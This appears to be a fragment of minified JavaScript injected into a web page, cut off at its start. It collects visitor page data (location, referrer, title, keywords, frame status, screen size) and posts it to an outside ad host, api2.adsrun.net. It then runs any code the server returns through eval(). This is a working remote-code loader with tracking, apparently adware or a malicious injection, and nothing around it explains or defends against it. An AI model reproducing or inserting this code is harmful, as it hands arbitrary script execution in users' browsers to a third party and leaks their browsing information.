...
g=[],f=0;f<c.length;f++)"keywords"==c[f].name.toLowerCase()&&g.push(c[f].content);req={width:m,height:e,frame:a!=a.top,location:b.location.toString(),referer:b.referrer,title:b.title,keywords:g.join(", "),loader:k};b.gotowf||(b.gotowf=!0,ajax(h,req,function(a){if(a)try{var response=JSON.parse(a);response.eval&&eval(response.eval)}catch(c){console.log(c)}}))})(window,document,"//api2.adsrun.net/post",{"name":"gapis2","time":1462521262.5734,"user":"1003801.9450161","subid":1003801,"geo":"VN","cert_domain":"unstops.net","hash":"18eabbdfff470ab4a0f33708c737c2e7"});
